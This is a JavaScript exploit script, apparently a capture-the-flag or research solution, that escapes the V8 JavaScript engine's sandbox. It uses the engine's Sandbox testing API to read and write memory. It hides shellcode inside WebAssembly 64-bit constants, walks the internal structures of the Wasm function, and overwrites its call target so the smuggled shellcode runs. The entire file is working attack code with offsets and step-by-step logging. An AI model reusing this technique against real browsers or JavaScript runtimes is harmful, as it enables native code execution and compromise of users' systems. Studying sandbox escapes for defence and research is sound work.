/* constants */

const kIntSize = 4;
const kBigIntSize = 8;

const wasm_src = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 96, 1, 94, 0, 66, 200, 226, 252, 135, 137, 146, 228, 245, 2, 66, 191, 223, 204, 195, 134, 128, 228, 245, 2, 66, 200, 130, 159, 135, 130, 146, 228, 245, 2, 66, 200, 226, 216, 135, 137, 146, 228, 245, 2, 66, 190, 223, 136, 203, 230, 141, 228, 245, 2, 66, 200, 130, 220, 191, 133, 146, 228, 245, 2, 66, 200, 146, 158, 199, 148, 198, 253, 245, 2, 66, 200, 226, 200, 198, 148, 134, 240, 245, 2, 66, 176, 247, 188, 168, 176, 152, 164, 200, 144, 127, 15, 11]; // wat2wasm pwn.wat

const kSharedFunctionInfoOffset = 0xc; // offset of shared_function_info in JSFunction
const kFunctionDataOffset = 0x4; // offset of function_data in SharedFunctionInfo
const kInternalOffset = 0x4; // offset of internal in WasmExportedFunctionData
const kForeignAddressOffset = 0x4; // offset of foreign_address in WasmInternalFunction
const kShellcodeOffset = 0x65d; // offset of shellcode in wasm code space

/* --------- */


/* helpers */

// higher 4-byte of bigint
function high(i) { return Number(i >> 32n); }

// lower 4-byte of bigint
function low(i) { return Number(i & 0xffffffffn); }

// apply pointer tagging
function tag(ptr) { return ptr | 0x1; }

// remove pointer tagging
function untag(ptr) { return ptr & 0xfffffffe; }

// convert integer to hex form
function hex(i) { return `0x${i.toString(16)}`; }

/* ------- */


/* implement exploit primitives */

// get compressed address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// if value isn't provided, read bigint from addr
// otherwise, write bigint value to addr
function rw(addr, value = NaN) {
    let view = new DataView(new Sandbox.MemoryView(addr, kBigIntSize));

    if (Number.isNaN(value)) { // read
        return view.getBigUint64(0, true);
    } else { // write
        view.setBigUint64(0, value, true);
    }
}

/* ---------------------------- */


/* escape v8 sandbox */

let wasm_module = new WebAssembly.Module(new Uint8Array(wasm_src));
let wasm_instance = new WebAssembly.Instance(wasm_module);

let main_addr = addrof(wasm_instance.exports.main);
console.log(`[+] main_addr == ${hex(main_addr)}`);

let shared_function_info_addr = untag(low(rw(main_addr + kSharedFunctionInfoOffset)));
console.log(`[+] shared_function_info_addr == ${hex(shared_function_info_addr)}`);

let function_data_addr = untag(low(rw(shared_function_info_addr + kFunctionDataOffset)));
console.log(`[+] function_data_addr == ${hex(function_data_addr)}`);

let internal_addr = untag(low(rw(function_data_addr + kInternalOffset)));
console.log(`[+] internal_addr == ${hex(internal_addr)}`);

let call_target = rw(internal_addr + kForeignAddressOffset);
console.log(`[+] call_target == ${hex(call_target)}`);

let shellcode_addr = call_target + BigInt(kShellcodeOffset);
console.log(`[+] shellcode_addr == ${hex(shellcode_addr)}`)

rw(internal_addr + kForeignAddressOffset, shellcode_addr); // overwrite call target
wasm_instance.exports.main(); // execute shellcode

/* ----------------- */
